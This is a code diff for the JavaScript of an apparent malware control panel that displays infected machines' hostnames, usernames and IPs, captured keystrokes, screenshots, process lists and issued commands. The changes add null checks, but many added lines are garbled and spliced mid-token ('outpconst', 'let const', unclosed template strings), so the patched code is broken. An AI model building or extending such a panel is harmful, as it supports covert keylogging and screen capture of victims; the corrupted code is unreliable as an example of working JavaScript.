@@ -636,9 +636,10 @@
                     
                     const status = client.online ? '🟢' : '🔴';
                     const systemInfo = client.system_info || {};
+                    const clientIdShort = client.client_id ? client.client_id.slice(0, 8) : 'Unknown';
                     
                     div.innerHTML = `
-                        <div style="font-weight: 600; margin-bottom: 5px;">${status} ${client.client_id.slice(0, 8)}</div>
+                        <div style="font-weight: 600; margin-bottom: 5px;">${status} ${clientIdShort}</div>
                         <div style="font-size: 0.9em; color: #6b7280;">
                             ${systemInfo.hostname || 'Unknown'}<br>
                             ${systemInfo.platform || 'Unknown'}
@@ -675,14 +676,17 @@
                 
                 if (client) {
                     const info = client.system_info || {};
+                    const clientId = client.client_id || 'Unknown';
+                    const lastSeen = client.last_seen ? new Date(client.last_seen * 1000).toLocaleString() : 'N/A';
+                    
                     document.getElementById('system-info').textContent = 
-                        `🆔 Client ID: ${client.client_id}\n` +
+                        `🆔 Client ID: ${clientId}\n` +
                         `💻 Hostname: ${info.hostname || 'N/A'}\n` +
                         `🖥️ Platform: ${info.platform || 'N/A'}\n` +
                         `👤 Username: ${info.username || 'N/A'}\n` +
                         `🌐 IP: ${client.ip || 'N/A'}\n` +
                         `📡 Status: ${client.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
-                        `⏱️ Last Seen: ${new Date(client.last_seen * 1000).toLocaleString()}\n` +
+                        `⏱️ Last Seen: ${lastSeen}\n` +
                         `📊 Check-ins: ${client.checkin_count || 0}`;
                 }
             } catch (error) {
@@ -732,11 +736,13 @@
                     if (Array.isArray(result)) {
                         let output = `📋 ${result.length} Processus:\n\n`;
                         output += `${'PID'.padEnd(8)} ${'Name'.padEnd(25)} ${'CPU%'.padEnd(8)} ${'Mem%'.padEnd(8)} ${'Status'.padEnd(12)}\n`;
-                        output += '─'.repeat(80) + '\n';
-                        
-                        result.slice(0, 50).forEach(proc => {
-                            output += `${String(proc.pid).padEnd(8)} ` +
-                                     `${String(proc.name || 'N/A').slice(0, 24).padEnd(25)} ` +
+                        outpconst procName = String(proc.name || 'N/A').slice(0, 24).padEnd(25);
+                            const procCpu = String(proc.cpu_percent || '0').slice(0, 6).padEnd(8);
+                            const procMem = String(proc.memory_percent || '0').slice(0, 6).padEnd(8);
+                            const procStatus = String(proc.status || 'N/A').slice(0, 11).padEnd(12);
+                            
+                            output += `${String(proc.pid || 'N/A').padEnd(8)} ` +
+                                     `${procName} ${procCpu} ${procMem} ${procStatus` +
                                      `${String(proc.cpu_percent || '0').slice(0, 6).padEnd(8)} ` +
                                      `${String(proc.memory_percent || '0').slice(0, 6).padEnd(8)} ` +
                                      `${String(proc.status || 'N/A').slice(0, 11).padEnd(12)}\n`;
@@ -1023,7 +1029,10 @@
                 const data = await response.json();
                 
                 if (data.keylogs && data.keylogs.length > 0) {
-                    let output = '⌨️ KEYLOGS:\n\n';
+                    let const clientId = log.client_id ? log.client_id.slice(0, 8) : 'Unknown';
+                        const timestamp = log.timestamp || 'N/A';
+                        const keystrokes = log.keystrokes || '';
+                        output += `[${timestamp}] ${clientId}: ${
                     data.keylogs.slice(0, 100).forEach(log => {
                         output += `[${log.timestamp}] ${log.client_id.slice(0, 8)}: ${log.keystrokes}\n`;
                     });
@@ -1123,10 +1132,13 @@
                 
                 const output = document.getElementById('screenshot-output');
                 output.innerHTML = '';
-                
-                if (data.screenshots && data.screenshots.length > 0) {
-                    data.screenshots.slice(0, 10).forEach(shot => {
-                        const div = document.createElement('div');
+                const clientId = shot.client_id ? shot.client_id.slice(0, 8) : 'Unknown';
+                        const timestamp = shot.timestamp || 'N/A';
+                        const screenshotData = shot.screenshot_data || '';
+                        div.innerHTML = `
+                            <div><strong>Client:</strong> ${clientId} | 
+                            <strong>Date:</strong> ${timestamp}</div>
+                            <img src="data:image/png;base64,${screenshotD
                         div.style.marginBottom = '15px';
                         div.innerHTML = `
                             <div><strong>Client:</strong> ${shot.client_id.slice(0, 8)} | 
@@ -1182,8 +1194,9 @@
         
         async function loadDBClients() {
             try {
-                const response = await fetch(`${API_BASE}/api/database/clients`);
-                const data = await response.json();
+                const reconst clientId = client.client_id ? client.client_id.slice(0, 12) : 'N/A';
+                        html += `<tr>
+                            <td>${clientId
                 
                 if (data.clients) {
                     let html = '<table><thead><tr><th>Client ID</th><th>IP</th><th>Hostname</th><th>Platform</th><th>First Seen</th><th>Last Seen</th></tr></thead><tbody>';
@@ -1209,10 +1222,12 @@
             try {
                 const response = await fetch(`${API_BASE}/api/database/keylogs`);
                 const data = await response.json();
-                
-                if (data.keylogs) {
-                    let html = '<table><thead><tr><th>Client</th><th>Timestamp</th><th>Keystrokes</th></tr></thead><tbody>';
-                    data.keylogs.slice(0, 100).forEach(log => {
+                const clientId = log.client_id ? log.client_id.slice(0, 8) : 'N/A';
+                        const keystrokes = log.keystrokes ? log.keystrokes.slice(0, 100) : '';
+                        html += `<tr>
+                            <td>${clientId}</td>
+                            <td>${log.timestamp || 'N/A'}</td>
+                            <td>${keystrokes{
                         html += `<tr>
                             <td>${log.client_id.slice(0, 8)}</td>
                             <td>${log.timestamp}</td>
@@ -1229,12 +1244,14 @@
         
         async function loadDBCommands() {
             try {
-                const response = await fetch(`${API_BASE}/api/database/commands`);
-                const data = await response.json();
-                
-                if (data.commands) {
-                    let html = '<table><thead><tr><th>ID</th><th>Client</th><th>Command</th><th>Status</th><th>Timestamp</th></tr></thead><tbody>';
-                    data.commands.slice(0, 100).forEach(cmd => {
+                const reconst commandId = cmd.command_id ? cmd.command_id.slice(0, 8) : 'N/A';
+                        const clientId = cmd.client_id ? cmd.client_id.slice(0, 8) : 'N/A';
+                        html += `<tr>
+                            <td>${commandId}</td>
+                            <td>${clientId}</td>
+                            <td>${cmd.command_type || 'N/A'}</td>
+                            <td>${cmd.status || 'N/A'}</td>
+                            <td>${cmd.created_at || 'N/A'forEach(cmd => {
                         html += `<tr>
                             <td>${cmd.command_id.slice(0, 8)}</td>
                             <td>${cmd.client_id.slice(0, 8)}</td>
@@ -1254,11 +1271,12 @@
         async function loadDBResults() {
             try {
                 const response = await fetch(`${API_BASE}/api/database/command_results`);
-                const data = await response.json();
-                
-                if (data.results) {
-                    let html = '<table><thead><tr><th>Command ID</th><th>Result</th><th>Timestamp</th></tr></thead><tbody>';
-                    data.results.slice(0, 100).forEach(res => {
+                const data = await rData = res.result_data ? JSON.stringify(res.result_data).slice(0, 100) : 'N/A';
+                        const commandId = res.command_id ? res.command_id.slice(0, 8) : 'N/A';
+                        html += `<tr>
+                            <td>${commandId}</td>
+                            <td>${resultData}...</td>
+                            <td>${res.timestamp || 'N/A'forEach(res => {
                         const resultPreview = JSON.stringify(res.result_data).slice(0, 100);
                         html += `<tr>
                             <td>${res.command_id.slice(0, 8)}</td>
@@ -1280,8 +1298,11 @@
                 const data = await response.json();
                 
                 const output = document.getElementById('db-screenshots-output');
-                output.innerHTML = '';
-                
+                output.iconst clientId = shot.client_id ? shot.client_id.slice(0, 8) : 'Unknown';
+                        const timestamp = shot.timestamp || 'N/A';
+                        const screenshotData = shot.screenshot_data || '';
+                        div.innerHTML = `
+                            <div><strong>Client:</strong> ${clientId
                 if (data.screenshots && data.screenshots.length > 0) {
                     data.screenshots.slice(0, 20).forEach(shot => {
                         const div = document.createElement('div');
